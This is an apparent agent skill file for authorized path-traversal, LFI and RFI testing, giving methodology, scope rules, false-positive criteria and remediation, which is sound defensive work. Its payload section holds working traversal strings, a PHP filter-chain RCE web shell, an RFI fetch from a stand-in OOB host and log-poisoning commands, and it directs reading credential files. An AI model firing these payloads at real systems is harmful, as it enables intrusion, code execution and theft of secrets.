---
name: path-traversal
description: "Canonical path-traversal capability: LFI/RFI, directory traversal read/write/delete, PHP filter-chain RCE, php:// / data:// / zip:// / phar:// wrappers, log/session/upload poisoning, Apache CVE-2021-41773/42013, PHP-CGI CVE-2024-4577, Zip Slip, ImageMagick coder sinks. Consolidates 2 sub-skills: hunt-lfi, performing-directory-traversal-testing. Use when hunting or validating path-traversal-related vulnerabilities."
sources: hackerone_public, synacktiv_research, portswigger_research
report_count: 24
---

# PATH-TRAVERSAL — Canonical Capability

## 1. Identity and purpose

This is the single primary executable capability for Path Traversal / Local File Inclusion / Remote File Inclusion (CWE-22, CWE-98, OWASP A01:2021 Broken Access Control). It consolidates 2 previously separate sub-skills (`hunt-lfi`, `performing-directory-traversal-testing`) into one operational entry point while preserving all source content in `references/` and the original sub-skill directories for rollback.

Primary objectives:
- Discover file-path parameters, include sinks, download/view endpoints, template engines, log/report generators, and APIs that accept file names/paths.
- Validate traversal/LFI/RFI with direct file contents, OOB callbacks, or timing deltas; escalate to RCE where authorized.
- Cover PHP filter-chain RCE (no upload), wrappers (php://, data://, expect://, zip://, phar://), log/session/upload poisoning, RFI, Zip Slip, and ImageMagick coder sinks.
- Produce reproducible, impact-rated findings with remediation guidance.

## 2. Scope

In scope:
- Directory traversal read/write/delete outside the intended directory.
- LFI (local file inclusion) leading to source disclosure or RCE.
- RFI (remote file inclusion) when `allow_url_include=On`.
- PHP wrappers and filter chains (Synacktiv 2022), phar:// deserialization, zip:// chains.
- Log/session/upload poisoning, Zip Slip / tar-symlink escape, ImageMagick coder read-sinks.
- Named CVEs: Apache 2.4.49/2.4.50 (CVE-2021-41773, CVE-2021-42013), PHP-CGI Windows (CVE-2024-4577).

Out of scope (hand off):
- Non-traversal injection classes (SQLi, command injection, SSTI, deserialization beyond phar://) → their own capabilities.
- Pure markup reflection without file read/execution → `hunt-html-injection` / `hunt-xss`.
- Auth/session flaws unrelated to included state → `hunt-auth-bypass` / `hunt-session`.

## 3. Invocation and routing

Use this capability when:
- A target accepts file names/paths in URL parameters, JSON bodies, headers, or templates.
- PHP/Java/Python/Node file-serve, `include`/`require`, `res.sendFile`, `express.static`, or report generators are present.
- You are validating traversal/LFI/RFI with Burp Suite, ffuf, dotdotpwn, or curl.
- A finding involves wrappers, filter-chain RCE, log poisoning, Zip Slip, or ImageMagick coders.

Routing notes:
- Hunting/discovery routes to `references/hunt-lfi.md` (attack surface, signals, phases, disclosed cases, OOB/blind gate).
- Structured testing workflow routes to `references/performing-directory-traversal-testing.md` (steps, automation, scenarios, output format).
- API details and payload tables route to `references/api-reference.md`.
- Detection agent usage routes to `performing-directory-traversal-testing/scripts/agent.py`.

## 4. Inputs and outputs

Inputs:
- Target base URLs, endpoints, parameters, headers, request templates.
- Optional: Burp Suite project, test accounts, callback host (interactsh/Collaborator).
- Optional: source code access for locating include/readFile/sendFile sinks and base paths.

Outputs:
- Confirmed or refuted traversal/LFI/RFI findings with file contents, OOB callback, or command output proof.
- Traversal bypass used, affected endpoint/parameter, and high-value files recovered.
- Reproduction steps, impact assessment, and remediation guidance.
- False-positive rulings with disproof rationale.

## 5. Preconditions and authorization

- Confirm written authorization and RCE testing scope before any payload execution.
- Use only test accounts and authorized targets; never read other users' data beyond proof.
- Prefer safe detection first (non-sensitive file read or OOB DNS) before RCE payloads.
- Avoid destructive writes; use canary files only where authorized.
- Respect rate limits and stop at account/tenant boundaries; document out-of-scope endpoints.

## 6. Reconnaissance

Recon steps:
1. Spider authenticated sessions; collect URLs and JS bundles; grep for file-handling params (`file`, `path`, `page`, `template`, `include`, `module`, `src`, `doc`, `download`, `img`, `pdf`, `report`, `dir`, `name`, `filename`).
2. Fingerprint stack: PHP (`X-Powered-By`, `.php`, PHPSESSID), Apache/Nginx banners, Java servlets, Python/Node, Windows IIS/.NET.
3. Identify file-download/view/include endpoints and template/report generators.
4. Check for Apache 2.4.49/2.4.50, PHP-CGI on Windows (XAMPP), ImageMagick, archive extraction features.
5. Review source (if available) for `include`, `require`, `file_get_contents`, `res.sendFile`, `express.static`, `sendFile`, `readFile`.
6. Enumerate high-value targets and callback host for blind/OOB confirmation.

See `references/hunt-lfi.md` (attack surface signals, phases).

## 7. Detection methodology

Core detection flow:
1. Identify candidate parameters and establish a baseline with a known-valid file.
2. Send basic traversal payloads (`../../../etc/passwd`, encoded variants, `....//`); look for real file contents, not echoed paths or status changes.
3. Apply encoding/filter bypasses (URL/double/UTF-8 overlong, null byte, case, mixed slashes).
4. For blind targets, use OOB callbacks (Collaborator/interactsh) or stable timing/length deltas (triple-confirmed).
5. For LFI, attempt source disclosure via `php://filter/convert.base64-encode`, then filter-chain RCE.
6. For RFI, point include at a controlled remote URL and confirm callback/execution.
7. Test Zip Slip and ImageMagick coder sinks where archive/image features exist.

References by phase:
- Hunting/bypasses: `references/hunt-lfi.md`.
- Testing workflow: `references/performing-directory-traversal-testing.md`.
- API details: `references/api-reference.md`.

## 8. Technique selection

Select techniques by observed stack/defenses:
- PHP LFI read → `php://filter/convert.base64-encode` for source; then **filter-chain RCE** (Phase 4) for execution with no upload.
- Stripped `../` → `....//`, `..%2f`, double-encode `%252f`, mixed separators.
- Appended extension → null byte `%00` (PHP <5.3.4), `?`/`#` truncation, long-path truncation.
- `allow_url_include=On` → RFI or `data://`/`php://input` execution.
- Readable logs → log poisoning → RCE (verify readability first).
- Upload + include → phar://, session poisoning, zip:// chains.
- Archive extraction → Zip Slip / tar-symlink escape.
- Image processing → ImageMagick MSL/MVG coder read-sinks.
- Apache 2.4.49/2.4.50 → CVE-2021-41773/42013 traversal/RCE.
- PHP-CGI on Windows → CVE-2024-4577 arg injection.

See `references/hunt-lfi.md` (bypass table, chain table) and `references/performing-directory-traversal-testing.md`.

## 9. Execution steps

1. Establish baseline request for each candidate endpoint/parameter.
2. Replay with one controlled change at a time; record status, body, timing, headers.
3. Detect traversal/LFI; confirm with real contents or OOB callback before claiming.
4. Apply bypass ladder; document which bypass succeeded.
5. Escalate LFI to RCE via filter-chain/wrappers/log/session/phar where authorized.
6. Read high-value files (`.env`, `wp-config.php`, keys, cloud creds) for impact.
7. Capture affected versions (Apache/PHP) and server-side effect.
8. Stop and document when a vector is not exploitable or out of scope.

## 10. Tool usage

- HTTP: Burp Suite (Repeater, Intruder, Collaborator), curl, Python requests/httpx.
- Fuzzing: ffuf, wfuzz, dotdotpwn, SecLists LFI wordlists.
- LFI automation: LFISuite, Kadimus, `performing-directory-traversal-testing/scripts/agent.py`.
- PHP filter-chain: `php_filter_chain_generator` (Synacktiv).
- OOB: Burp Collaborator, interactsh.
- Evidence: saved requests/responses, decoded file contents, callback logs, screenshots, canary values.

See `references/performing-directory-traversal-testing.md` (Tools & Systems) and `references/hunt-lfi.md`.

## 11. Payloads and test cases

Basic traversal:
```bash
?file=../../../etc/passwd
?file=....//....//....//etc/passwd
?file=..%2f..%2f..%2fetc%2fpasswd
?file=..%252f..%252f..%252fetc%252fpasswd
?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd
?file=/etc/passwd%00.png
```

Windows:
```bash
?file=..\..\..\windows\win.ini
?file=..%5c..%5c..%5cwindows%5cwin.ini
```

PHP source disclosure:
```bash
?file=php://filter/convert.base64-encode/resource=index.php
```

PHP filter-chain → RCE:
```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
?file=php://filter/convert.iconv.UTF8.CSISO2022KR|...<chain>...|convert.base64-decode/resource=php://temp&c=id
```

RFI:
```bash
?file=http://OOB-HOST/shell.txt
```

Log poisoning:
```bash
curl -s https://$TARGET/ -H "User-Agent: <?php system(\$_GET['c']); ?>"
?file=../../../var/log/apache2/access.log&c=id
```

Archive/image sinks:
```bash
# Zip Slip entry: ../../../etc/cron.d/x
# ImageMagick: label:@/etc/passwd or MSL payload
```

Named CVEs:
```bash
# Apache 2.4.49/2.4.50
curl -s "https://$TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
# PHP-CGI Windows (CVE-2024-4577)
```

Additional variants, bypass tables, high-value file lists, and automation live in `references/hunt-lfi.md` and `references/performing-directory-traversal-testing.md`.

## 12. Evidence

Each finding must include:
- Exact request and response (raw HTTP, parameter values, body).
- Real file contents (or decoded base64) proving the read; for blind, OOB callback log with server source IP.
- Traversal bypass used and affected endpoint/parameter.
- For RCE, command output or OOB callback from inside the executed payload.
- Authentication context (account/role) and server-side effect.
- Impact assessment and affected scope.

## 13. Reproduction and validation

- Reproduce with curl or a saved raw request in a clean session where possible.
- Validate with safe detection first (non-sensitive file or OOB DNS), then escalate only if authorized.
- Confirm with two accounts/roles where applicable; verify execution context.
- For blind vectors, confirm via OOB callback or triple-confirmed timing/length delta; mark refuted if ambiguous.
- For RCE, show command output you control; "payload accepted" is not RCE.
- Mark as refuted if the path is echoed but not read, or no concrete impact exists.

## 14. False-positive rejection

Reject or downgrade when:
- The input is merely echoed in an error message (path formatter), not file contents.
- A different status code/error for `../../etc/passwd` vs normal value is the only signal (string-matching, no filesystem access).
- Page "looks different" but no content match/OOB callback.
- Base64 decode of a filter read is empty/garbage.
- RFI callback is caused by another component, not the include.
- Traversal is blocked by canonicalization/allowlist with no bypass.
- Response differences are due to caching, localization, or benign metadata.

## 15. Impact

Impact guidance:
- Critical: RCE via filter-chain/RFI/log/session/phar/CVE with server process privileges.
- High: File read exposing DB creds/API keys/private keys/cloud creds; source disclosure enabling further exploitation.
- Medium: Read of non-sensitive files or limited path traversal without secret exposure.
- Low: Traversal attempted/blocked; hardening gap without exploit path.

Always tie impact to concrete file contents or execution; "parameter looks traversable" is not impact.

## 16. Reporting

Report template:
- Summary: endpoint/parameter, vulnerability type (path traversal/LFI/RFI), impact.
- Scope/authorization: test *** and accounts.
- Steps to reproduce: numbered, minimal (baseline → traversal → bypass → proof).
- Proof of concept: raw request/response, payload, file contents/OOB callback.
- Affected component: stack/version (Apache/PHP) where applicable.
- Impact: business and data scope, execution context.
- Remediation: allowlist permitted file names; resolve canonical path and verify it stays within intended directory; run web server with minimal FS permissions; remove sensitive files from web roots; disable `allow_url_include`/`allow_url_fopen` and unused wrappers; patch CVEs; validate archives (Zip Slip) and sanitize ImageMagick coders.
- References: OWASP A01:2021, CWE-22, CWE-98, relevant CVEs/advisories.

## 17. Failure modes

- Surface not fully discovered → expand recon (JS bundles, mobile, versions, archive/image features).
- No test account → request credentials or scope clarification; do not bypass without authorization.
- WAF/gateway blocks payloads → try encoding ladder, POST body, parser differentials.
- Rate limiting stops testing → coordinate throttling or test windows.
- Blind LFI inconclusive → repeat with fresh sessions and OOB/timing diff; mark not confirmed if ambiguous.
- Tooling unavailable (ffuf/dotdotpwn) → use curl/agent.py; document limitation.
- OOB callback not received → verify collaborator host and egress; test multiple input locations.

## 18. References

All 2 sub-skill references are preserved and must resolve:

| Reference | Sub-capability | Load when |
|---|---|---|
| `references/hunt-lfi.md` | `hunt-lfi` | Hunting/bypasses, attack surface, phases, disclosed cases, OOB gate |
| `references/performing-directory-traversal-testing.md` | `performing-directory-traversal-testing` | Testing workflow, automation, scenarios, output format |

Additional preserved material:
- `references/api-reference.md` — API reference and payload tables (mirrored from the testing sub-skill).
- `performing-directory-traversal-testing/scripts/agent.py` — helper script.

Original sub-skills remain intact under `hunt-lfi/` and `performing-directory-traversal-testing/`.

## 19. Testing and mastery

- Validate with the capability tests in `tests/test_path_traversal_capability.py`.
- Confirm all referenced files resolve and are non-empty.
- Confirm migration map paths/hashes/status are accurate.
- Practice on authorized labs: PortSwigger file path traversal, OWASP WebGoat, DVWA, HackTheBox.
- Mastery criteria: independently discover, validate, and report a path-traversal/LFI/RFI finding with full reproduction, bypass used, and impact.


## Knowledge sources

- WKS bug classes: path_traversal
- Domain knowledge: path_traversal
- WKS remains the structured source of truth; retrieve and validate items through WKS rather than duplicating the full corpus in this skill.
- Research and learning material is mapped in `stage-a/knowledge-source-map.json` and must be validated before promotion.
